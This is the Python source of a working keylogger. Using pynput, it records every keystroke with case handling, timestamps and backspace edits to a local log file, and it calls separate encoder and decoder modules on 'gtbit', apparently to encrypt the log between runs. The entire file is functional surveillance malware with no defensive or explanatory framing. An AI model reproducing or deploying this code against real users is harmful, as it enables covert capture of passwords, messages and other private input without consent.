import os
import atexit
from pynput import keyboard
from datetime import datetime
from encoder import encode
from decoder import decode

caps_lock_active = False
shift_pressed = False
cleanup = True

def exit_program():
    global cleanup
    if cleanup:
        print("exiting...")
        encode('gtbit')

atexit.register(exit_program)
def log_to_file(content):
    with open("logfile.txt", 'a') as logKey:
        logKey.write(content)




def keyPressed(key):
    global shift_pressed, caps_lock_active
    try:
        if hasattr(key, 'char'):
            char = key.char
            if (caps_lock_active and char.isalpha()) or (shift_pressed and char.isalpha()):
                char = char.upper()
            log_to_file(char)
        elif key == keyboard.Key.space:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_to_file(f"\n(Timestamp: {timestamp})\n")
        elif key == keyboard.Key.enter:
            log_to_file('\n[ENTER]\n')
        elif key == keyboard.Key.tab:
            log_to_file(" [TAB] ")
        elif key == keyboard.Key.backspace:
            with open("logfile.txt", 'r+') as logKey:
                content = logKey.read()
                logKey.seek(0)
                logKey.truncate()
                logKey.write(content[:-1])
        elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
            shift_pressed = True
        elif key == keyboard.Key.caps_lock:
            caps_lock_active = not caps_lock_active

    except FileNotFoundError:
        log_to_file("")

def keyReleased(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

if __name__ == "__main__":
    with open('logfile.txt','r') as logs:
        logs.seek(0,os.SEEK_END)
        logs_size = logs.tell()
        if logs_size != 0:
            try:
                decode('gtbit')
            except:
                cleanup = False
    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
    listener.start()
    input()